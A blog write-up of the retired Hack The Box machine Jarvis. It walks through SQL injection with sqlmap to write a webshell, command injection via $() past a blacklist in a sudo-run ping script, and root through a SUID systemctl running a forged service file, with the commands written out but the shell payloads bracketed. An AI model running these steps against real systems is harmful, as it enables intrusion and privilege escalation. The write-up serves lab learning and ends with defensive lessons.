---
layout: post
title: "The Filter That Forgot a Door"
subtitle: "HTB Jarvis, where a hotel booking page writes your shell to disk, a blacklist forgets one syntax, and a SUID systemctl hands you root through a service file you wrote yourself"
date: 2019-11-16 12:00:00 +0000
description: "A booking page that writes files, a blacklist with a hole in it, and a SUID systemctl that runs any service you hand it. Three locks, none of them held."
image: /assets/og/the-filter-that-forgot-a-door.png
tags: [hackthebox, writeup]
---

Jarvis is a hotel that lets a guest write on the walls. The front desk is a booking site, and one of its pages takes a room number straight off the URL and pastes it into a database query without ever asking whether that room number is really a number. From there the box is a study in things that almost held. A web application firewall that stops the lazy scan but not a patient one. A blacklist that bans every dangerous character except the one shape that mattered. A privileged binary that was supposed to manage services and will gladly manage the one you forge in memory. Nobody overpowered this machine. Three filters each forgot a single door, and three doors is all it takes.

```
        S T A R K   H O T E L
        =====================
        room.php?cod=1   "which room, sir?"
                 cod=1 UNION SELECT ...   "ah, ALL of them"
                        |
                        v
        the query reads your sentence as a command,
        then writes your shell to /var/www as a favor.

        a ping tool bans &  ;  -  `  |  ||
        and never thinks to ban  $( )
                        |
                        v
        systemctl wears a SUID crown.
        hand it a service file and it runs as root.
                                            門
```

## 0x01 · the lobby

Three ports answer, and two of them are the same web server wearing two different doors.

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
```

Port 80 is a polished marketing site for the Stark Hotel. Port 64999 answers too, but it greets every visitor with a stern note about being banned, which is a trap and a tell at once. The interesting surface is the booking flow on 80. Click into a room and the URL says `room.php?cod=1`. That `cod` is a room code, and it is the first thing on this box that takes a value off the wire and trusts it.

## 0x02 · the room code that asked too much

Any time a page builds a database lookup out of something you typed, your job is to test whether the database can tell your data apart from its own instructions. It cannot. Tack a single quote onto `cod` and the page breaks in the specific way that means the quote reached the query engine and confused it. That is SQL injection, the same family of bug that has haunted login forms for two decades.

Think of the query as a sentence the server reads aloud to the database. It means to say "fetch the room whose code is 1." You hand it `1 UNION SELECT ...` and now the sentence has a second clause the server never wrote, and the database, which only reads sentences and never questions who authored them, answers both halves honestly. The room query uses seven columns, so a `UNION SELECT` with seven slots lets you ask the database for anything it knows and have the answer printed back where a room description should be.

There is a speed bump. The site runs a homemade web application firewall called IronWAF, and pointed at it raw, `sqlmap` gets slapped down. The fix is to stop looking like a machine gun. Slow the tool, rotate the user agent, and stay polite.

```
$ sqlmap -u 'http://10.10.10.143/room.php?cod=1' \
    --random-agent --level 1 --risk 1 --batch --dbs
...
available databases [4]:
[*] hotel
[*] information_schema
[*] mysql
[*] performance_schema
```

Picture the WAF as a nightclub bouncer who only knows how to spot the obvious troublemakers, the ones who sprint at the door. Walk up slowly, wear a normal coat, and he waves you through. The injection was always there. The bouncer just guarded the sprint, not the stroll. Dump the `mysql.user` table and a real account falls out.

```
Database: mysql
Table: user
[1 entry]
+----------+-------------------------------------------+
| User     | Password                                  |
+----------+-------------------------------------------+
| DBadmin  | *2D2B7A5E4E637B8FBA1D17F40318F277D29964D0 |
+----------+-------------------------------------------+
```

That hash is a MySQL5 hash, and it folds quickly against a wordlist into `imissyou`. Worth keeping, but the database account is not the real prize here.

## 0x03 · the query that wrote a file

A database that you can talk to through a web page is usually a place to read. This one is also a place to write. MySQL has a feature, `INTO OUTFILE`, that lets a query save its result to a path on the server's own disk, and the account driving this injection is allowed to use it. So instead of asking the database to read a secret, you ask it to write a file, and you choose the contents and the path.

`sqlmap` wraps this in one flag. Point its file write at the web root and drop a tiny PHP command runner where Apache will happily serve and execute it.

```
$ sqlmap -u 'http://10.10.10.143/room.php?cod=1' \
    --random-agent --level 1 --risk 1 --batch \
    --file-write ./iceberg.php --file-dest /var/www/html/iceberg.php
```

The file that lands is a one-line PHP webshell, which I will describe and not print.

```
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

I am bracketing it on purpose, and the reason is the lesson. The literal string is about four words long, and the moment it touches a disk that any antivirus is watching, it gets quarantined as malware, which is the most honest review a one-line backdoor will ever get. Picture it instead of pasting it. Browse to it with a command in the query string and the box answers in the voice of the web server.

```
$ curl 'http://10.10.10.143/iceberg.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Trade the webshell up for a proper reverse shell and you are standing on the box as `www-data`, the low-privilege identity Apache runs as.

```
$ curl 'http://10.10.10.143/iceberg.php' --data-urlencode \
    'cmd=[ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]'
```

## 0x04 · the blacklist with one hole in it

`www-data` cannot do much, so check what it is allowed to run as someone else.

```
www-data@jarvis:/$ sudo -l
User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
```

You can run one Python script as the user `pepper`, and you do not even need a password. Read the script. It is an admin helper with a ping feature, and the ping feature is where it gets careless. It takes an address from you and builds a shell command around it.

```python
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)
```

The author thought about this. They built a blacklist of the characters an attacker would use to chain a second command onto the ping, and they banned the ampersand, the semicolon, the backtick, the pipe. It is a real attempt at a fence. The trouble with fencing by blacklist is that you have to remember every gate, and they forgot one. Bash has another way to run a command inside another command, the dollar-paren shape `$(...)`, and none of those characters are on the list.

Think of it like a guest list that names every troublemaker in town and turns them all away at the door, then leaves the loading dock around the back wide open because nobody on the list ever used it. The fence is real. It just is not a circle. Feed the ping prompt an address with a command tucked inside `$()` and the shell runs your command on the way to building the ping.

```
www-data@jarvis:/$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(/tmp/iceberg.sh)
```

Where `/tmp/iceberg.sh` is a small script you dropped that calls a reverse shell back to your listener. The substitution runs first, as `pepper`, and your catcher lights up.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.143
pepper@jarvis:~$ id
uid=1000(pepper) gid=1000(pepper) groups=1000(pepper)
pepper@jarvis:~$ cat user.txt
████████████████████████████████
```

## 0x05 · the crown left on the workbench

Now you are `pepper`, and the climb to root is short and clean. Hunt for binaries wearing the SUID bit, the flag that makes a program run with its owner's privileges no matter who launches it.

```
pepper@jarvis:~$ find / -perm -4000 -group pepper 2>/dev/null
-rwsr-x--- 1 root pepper 174520 /bin/systemctl
```

That line is the whole endgame. `systemctl` is the tool that controls services on a modern Linux box, and services run as root because managing the system is root's job. This copy is owned by root, carries the SUID bit, and is readable only by the `pepper` group. So when `pepper` runs it, it runs as root. The catch is that `systemctl` does not have a "give me a shell" button. It manages services. So you write a service whose only job is to run your command, and you let `systemctl` start it for you.

A systemd service is just a small text file describing a thing to run. Drop one in a writable spot and have its `ExecStart` call a reverse shell.

```
pepper@jarvis:/dev/shm$ cat iceberg.service
[Service]
Type=oneshot
ExecStart=/bin/bash -c '[ bash reverse shell to 10.10.14.4 on 443 ]'

[Install]
WantedBy=multi-user.target
```

Picture `systemctl` as a building superintendent with the master key, hired to start and stop the machines the owner installed. Nobody told him to check who wrote the work order. Hand him a slip that says "run this program," and because the master key is already on his belt, the program runs with the run of the whole building. Register the file and start it.

```
pepper@jarvis:/dev/shm$ /bin/systemctl link /dev/shm/iceberg.service
pepper@jarvis:/dev/shm$ /bin/systemctl start iceberg
```

The listener answers in root's voice.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.143
root@jarvis:/# id
uid=0(root) gid=0(root) groups=0(root)
root@jarvis:/# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Every step on Jarvis is a fence with exactly one gap, and the gaps rhyme. The booking page tried to be a lookup and forgot that a value off the wire can carry a clause the server never wrote. The ping tool tried to be safe and built a blacklist, which is a promise to remember every dangerous thing forever, a promise no one keeps. The systemctl binary tried to delegate a chore and never checked who wrote the chore down. None of these is an exotic memory-corruption trick. All three are the same confession in different rooms, which is that a program took something from a stranger and treated part of it as an instruction.

The blacklist is the one I would frame on the wall. A blacklist is the security model that loses by default, because the defender has to think of every attack and the attacker only has to think of one the defender missed. Whitelisting flips the math. If that ping tool had accepted only the characters that appear in an actual IP address and rejected everything else, `$()` never gets a hearing, because dollar signs and parentheses are not part of an address. You do not enumerate the bad. You define the good and refuse the rest, because the set of good things is small and knowable and the set of bad things is infinite and clever.

And the SUID systemctl is the kind of mistake that ships green, with nothing unpatched and no CVE to blame. Somebody made a system tool convenient for one user and handed out root by accident, because a tool that runs anything you describe is root with extra steps. Convenience and privilege should never share a key.

## 0x07 · outro

```
the room code carried a clause the page never wrote.
the ping tool banned every door but the back one.
the service tool ran the order without reading the name.

three fences, each missing one slat.
a blacklist is a fence you have to finish forever.

define the good. count the keys. wear black.

                                                            EOF
```

---

*HTB: Jarvis, retired 09 Nov 2019. A medium Linux box that is really a lecture on blacklists wearing a hotel uniform, from an injectable booking page to a SUID systemctl that runs whatever you write down.*